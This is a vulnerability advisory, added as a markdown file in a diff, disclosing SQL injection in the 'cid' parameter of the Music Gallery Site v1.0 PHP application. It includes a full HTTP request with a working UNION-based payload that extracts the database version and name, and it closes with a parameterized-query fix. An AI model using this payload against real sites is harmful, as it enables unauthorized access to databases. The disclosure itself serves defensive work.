@@ -1,0 +1,60 @@
+# Music Gallery Site - SQL Injection on page music_list.php and parameter cid is vulnerable, application url is (?page=music_list&cid=?). 
+>Any remote attacker can access this page to exploit the vulnerbility.
+
+### Date: 
+> 21 February 2023
+### Author Name: 
+> Muhammad Navaid Zafar Ansari
+### Author Email: 
+> navaidnasari@hotmail.co.uk
+### Vendor Homepage:
+> https://www.sourcecodester.com
+### Software Link:
+> [Music Gallery Site](https://www.sourcecodester.com/php/16073/music-gallery-site-using-php-and-mysql-database-free-source-code.html)
+### Version:
+> v 1.0
+### SQL Injection
+> SQL Injection is a type of vulnerability in web applications that allows an attacker to execute unauthorized SQL queries on the database by exploiting the application's failure to properly validate user input. The attacker can use this vulnerability to bypass the security measures put in place by the application, allowing them to access or modify sensitive data, or even take control of the entire system. SQL Injection attacks can have severe consequences, including data loss, financial loss, reputational damage, and legal liability. To prevent SQL Injection attacks, developers should properly sanitize and validate all user input, and implement strong security measures, such as input validation, output encoding, parameterized queries, and access controls. Users should also be aware of the risks of SQL Injection attacks and take appropriate measures to protect their data.
+### Affected Page:
+> music_list.php
+> On this page cid parameter is vulnerable to SQL Injection Attack
+> URL of the vulnerable parameter is: /?page=music_list&cid=*
+### Description:
+> The Music Gallery site does have public pages for music library, on music list there is an SQL injection to filter out the music list with category basis.
+### Proof of Concept:
+> Following steps are involved:
+1. Go to the category menu and click on view category.
+2. In URL, there is a parameter 'cid' which is vulnerable to SQL injection (?page=music_list&cid=4*)
+### Request:
+```
+GET /php-music/?page=music_list&cid=5%27+and+false+union+select+1,version(),database(),4,5,6,7--+- HTTP/1.1
+Host: localhost
+sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+```
+### Response:
+
+![image](https://user-images.githubusercontent.com/123810418/220299762-3a0c02cf-364b-49a0-81e5-e7f3f6ed298b.png)
+
+### Recommendation:
+> Whoever uses this CMS, should update the code of the application in to parameterized queries to avoid SQL Injection attack:
+```
+Example Code: 
+$sql = $obj_admin->db->prepare("SELECT * FROM `category_list` where `id` = :id and `delete_flag` = 0 and `status` = 1");
+$sql->bindparam(':id', $cid);
+$sql->execute();
+$row = $sql->fetch(PDO::FETCH_ASSOC);
+```
+Thank you for reading
